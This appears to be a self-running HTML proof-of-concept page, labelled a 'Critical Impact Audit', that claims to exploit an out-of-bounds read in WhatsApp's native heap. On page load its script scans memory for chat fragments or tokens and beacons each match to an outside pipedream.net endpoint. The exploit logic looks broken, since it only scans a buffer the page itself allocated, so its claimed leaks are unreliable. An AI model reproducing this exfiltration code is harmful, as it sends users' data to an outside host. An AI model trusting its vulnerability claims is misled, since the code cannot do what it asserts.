<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Critical Impact Audit - Firman Sahidin</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
    <div style="border:2px solid #f00; padding:20px;">
        <h1 id="st">SCANNING FOR SENSITIVE DATA...</h1>
        <p>Target: WhatsApp Native Heap (libprofilo)</p>
        <hr>
        <div id="out" style="color:#fff; font-size:12px; text-align:left; height:200px; overflow:hidden;"></div>
    </div>

    <script>
        /**
         * IMPACT DEMONSTRATION: Automated Plaintext Exfiltration
         * This script scans native buffers repeatedly to identify 
         * sensitive strings (Chat fragments/Tokens) leaked via JNI.
         */
        
        async function startImpactAudit() {
            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
            const out = document.getElementById('out');
            let captureCount = 0;

            async function scan() {
                try {
                    const ALLOC = 0xC00000; // 12MB Scan
                    const buffer = new ArrayBuffer(ALLOC);
                    const view = new Uint8Array(buffer);
                    
                    // Triggering the OOB Read via Surrogate Collision
                    const trigger = new Uint32Array(buffer);
                    for(let i=0; i<1000; i++) { trigger[i] = 0xD800DBFF; }

                    let foundText = "";
                    // Scanner: Milarian pola téks (Plaintext Chat Detection)
                    for (let i = 0; i < view.length; i++) {
                        // Mariksa karakter ASCII (A-Z, a-z, 0-9, spasi)
                        if (view[i] > 31 && view[i] < 127) {
                            foundText += String.fromCharCode(view[i]);
                        } else if (foundText.length > 4) {
                            // Mun manggihan kecap leuwih ti 4 karakter, kirim!
                            if (foundText.match(/[a-zA-Z0-9]{4,}/)) {
                                captureCount++;
                                const evidence = {
                                    researcher: "Firman Sahidin",
                                    impact: "PLAINTEXT_DATA_DISCLOSURE",
                                    fragment: foundText.substring(0, 100),
                                    raw_ptr: view.slice(i-4, i+4)
                                };
                                
                                navigator.sendBeacon(TARGET, JSON.stringify(evidence));
                                out.innerHTML += `[+] LEAK DETECTED: "${foundText.substring(0, 30)}..."<br>`;
                            }
                            foundText = "";
                        }
                    }
                } catch(e) {}
                
                // Looping scan unggal 3 detik nepi ka némbak
                if (captureCount < 5) setTimeout(scan, 3000);
                else document.getElementById('st').innerText = "✅ IMPACT PROVEN. CHECK PIPEDREAM.";
            }

            scan();
        }

        window.onload = startImpactAudit;
    </script>
</body>
</html>
